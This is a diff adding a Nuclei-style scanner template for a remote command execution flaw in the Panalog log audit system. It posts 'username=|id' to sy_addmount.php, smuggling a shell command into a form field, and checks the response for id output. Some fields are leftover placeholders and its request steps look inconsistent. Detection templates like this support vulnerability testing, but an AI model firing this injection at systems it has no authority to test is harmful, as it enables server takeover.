@@ -1,0 +1,32 @@
+id: Panabit-Panalog-addmount-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: Panalog日志审计系统 sy_query.php接口处存在远程命令执行漏洞，攻击者可执行任意命令，接管服务器权限。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/P3-5Panalog-%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F-RCE?id=p3-5panalog-%e6%97%a5%e5%bf%97%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f-rce
+  tags: tags
+
+variables:
+  filename: "{{rand_base(6)}}"   
+http:
+  - raw:
+      - |-
+        POST /account/sy_addmount.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Connection: close
+
+        username=|id
+      - |+
+        GET /account/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
